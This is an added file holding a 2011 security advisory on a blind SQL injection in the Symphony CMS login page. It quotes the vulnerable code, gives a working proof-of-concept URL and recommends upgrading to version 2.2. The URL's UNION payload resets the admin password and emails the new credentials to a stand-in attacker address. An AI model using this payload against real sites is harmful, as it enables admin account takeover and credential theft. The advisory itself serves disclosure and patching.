@@ -1,0 +1,45 @@
+--------------------------------------------------------------------------------------------
+20110424 - Justanotherhacker.com : Symphony-cms blind sql injection
+JAHx111 - http://www.justanotherhacker.com/advisories/JAHx111.txt
+--------------------------------------------------------------------------------------------
+
+Symphony is a web-based content management system (CMS) that enables users to create and 
+manage websites and web applications of all shapes and sizes?from the simplest of blogs to 
+bustling news sites and feature-packed social networks.
+[ Taken from: http://symphony-cms.com/ ]
+
+
+--- Vulnerability description ---
+The symphony cms login page does not sufficiently filter user supplied variables used in a 
+SQL statement, resulting in a blind sql injection vulnerability. The vulnerable code is located at:
+content.login.php-270-$sql = "SELECT t1.`id`, t1.`email`, t1.`first_name`
+content.login.php-271-            FROM `tbl_authors` as t1, `tbl_forgotpass` as t2
+content.login.php:272:                WHERE t2.`token` = '".$_REQUEST['token']."' AND t1.`id` = t2.`author_id`
+content.login.php-273-                LIMIT 1";
+content.login.php-274-
+content.login.php-275-$author = Symphony::Database()->fetchRow(0, $sql);
+
+Discovered by: Eldar "Wireghoul" Marcussen
+Type: Blind sql injection
+Severity: Moderate
+Release: Full
+CVE: None
+Vendor: Symphony-cms
+Affected versions: 2.1.2 and possibly older versions
+
+--- Proof of Concept ---
+The following example will reset the password of the admin user which was created during installation 
+(id 1) and send an email to 'evil@email.com' with the username and new password. 
+http://example.com/symphony/login/?action=resetpass&token=-1'+union+select+id,'evil@email.com',username+from+tbl_authors+where+id+=1+--+
+
+We are aided by the following code:
+lib/toolkit/class.mysql.php:251:if($this->_connection['tbl_prefix'] != 'tbl_'){
+lib/toolkit/class.mysql.php:252:    $query = preg_replace('/tbl_(\S+?)([\s\.,]|$)/', $this->_connection['tbl_prefix'].'\\1\\2', $query);
+Which turn our tbl_authors into the appropriate prefixed table name. This essentially negates the use 
+of custom prefix for tables.
+
+--- Solution ---
+Upgrade to version 2.2
+
+--- Disclosure time line ---
+24-Apr-2011 - Public disclosure
